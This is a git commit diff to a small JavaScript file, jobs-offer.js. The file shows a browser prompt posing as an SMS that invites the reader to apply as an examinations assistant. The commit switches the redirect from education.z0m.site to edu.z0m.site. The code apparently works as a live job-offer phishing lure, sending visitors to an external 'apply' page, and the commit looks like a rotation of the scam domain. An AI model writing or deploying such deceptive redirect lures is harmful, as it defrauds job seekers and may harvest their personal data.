20a3ba3aeb5719dc68eb13b7e058a428b88bedb3
surprise24x7 <132287490+surprise24x7@users.noreply.github.com>
2024-09-20 18:04:29 +0530

    Update jobs-offer.js

--- jobs-offer.js
+++ jobs-offer.js
@@ -2,5 +2,5 @@
 var password = 'EXAMINATION ASSISTANT'
 password=prompt('SMS: You are invited to apply as examinations assistant for July and December 2024 marking sessions. kindly press Ok to start application now ','EXAMINATION ASSISTANT');
 if (password != 'EXAMINATION ASSISTANT') {
-location.href='https://education.z0m.site/apply.html';
+location.href='https://edu.z0m.site/apply.html';
 }
